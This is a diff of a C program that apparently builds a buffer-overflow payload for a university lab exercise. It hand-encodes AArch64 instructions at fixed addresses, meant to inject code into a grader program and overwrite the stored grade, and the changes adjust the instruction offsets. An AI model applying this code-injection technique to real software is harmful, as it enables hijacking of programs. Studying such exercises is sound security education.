@@ -23,7 +23,7 @@ int main(void){
    pAAttack = 0x420058;
 
    /* Changes to be pointing to mov instead of name */
-   pAAttack = pAAttack + 8;
+   pAAttack = pAAttack + 12;
    
    /* Writes the student's names */
    ulData = 0x00006E655678614D;
@@ -38,7 +38,7 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* bl printf     */
-   ulInstruction = MiniAssembler_bl(0x400690, pAAttack + 8);
+   ulInstruction = MiniAssembler_bl(0x400690, pAAttack + 4);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* mov w0, '+'   */
@@ -46,7 +46,7 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* adr x1, grade */
-   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 16);
+   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 12);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* strb wo, [x1] */
@@ -54,7 +54,7 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* b  printf     */
-   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 24);
+   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 20);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* Writes the null byte at the end of the instructions */
